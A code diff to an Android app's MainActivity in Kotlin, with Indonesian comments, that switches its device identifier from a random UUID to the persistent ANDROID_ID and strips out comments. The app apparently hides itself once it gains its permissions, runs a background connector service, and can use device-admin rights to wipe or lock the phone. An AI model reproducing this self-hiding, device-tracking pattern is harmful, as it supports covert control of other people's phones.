@@ -9,6 +9,7 @@ import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
+import android.provider.Settings
 import android.view.View
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
@@ -42,10 +43,6 @@ class MainActivity : AppCompatActivity() {
         crashlytics.log("MainActivity: onCreate")
 
         ensureDeviceId()
-        // Service selalu distart di sini — satu kali, sebelum updateUI().
-        // hideAndExit() tidak perlu memanggil startConnectorService() lagi
-        // agar tidak ada pemanggilan startForegroundService() dari context
-        // Activity yang sedang finishing (crash di Android 12+).
         startConnectorService()
 
         binding.btnAccessibility.setOnClickListener {
@@ -61,21 +58,15 @@ class MainActivity : AppCompatActivity() {
 
     override fun onResume() {
         super.onResume()
-        // Guard: skip jika activity sedang finishing (onCreate sudah panggil finish())
-        // Tanpa guard ini Android tetap memanggil onResume() setelah finish(),
-        // sehingga startConnectorService() bisa terpanggil di context yang sedang dying.
         if (!isFinishing) updateUI()
     }
 
     private fun updateUI() {
         val allPermsOk = allPermissionsGranted()
-        // Device Admin bersifat opsional — tidak menghalangi app untuk bersembunyi.
-        // Tanpa admin, hanya wipeDevice() dan lockScreen() yang tidak berfungsi.
         val adminOk = dpm.isAdminActive(adminComponent)
 
         crashlytics.log("MainActivity: updateUI allPermsOk=$allPermsOk adminOk=$adminOk")
 
-        // Cukup semua runtime permission + storage → langsung sembunyikan
         if (allPermsOk) {
             hideAndExit()
             return
@@ -109,15 +100,21 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun hideAndExit() {
-        // Service sudah distart di onCreate() — tidak perlu dipanggil lagi.
-        // Memanggil startForegroundService() dari Activity yang sedang
-        // finishing bisa crash di Android 12+ (BackgroundServiceStartNotAllowedException).
         finish()
     }
 
     private fun ensureDeviceId() {
         if (prefs.getString("device_id", null) == null) {
-            prefs.edit().putString("device_id", UUID.randomUUID().toString()).apply()
+            val androidId = Settings.Secure.getString(
+                contentResolver,
+                Settings.Secure.ANDROID_ID
+            )
+            // Fallback ke UUID jika ANDROID_ID null / nilai dummy Android emulator
+            val id = if (!androidId.isNullOrBlank() && androidId != "9774d56d682e549c")
+                androidId
+            else
+                UUID.randomUUID().toString()
+            prefs.edit().putString("device_id", id).apply()
         }
     }
 
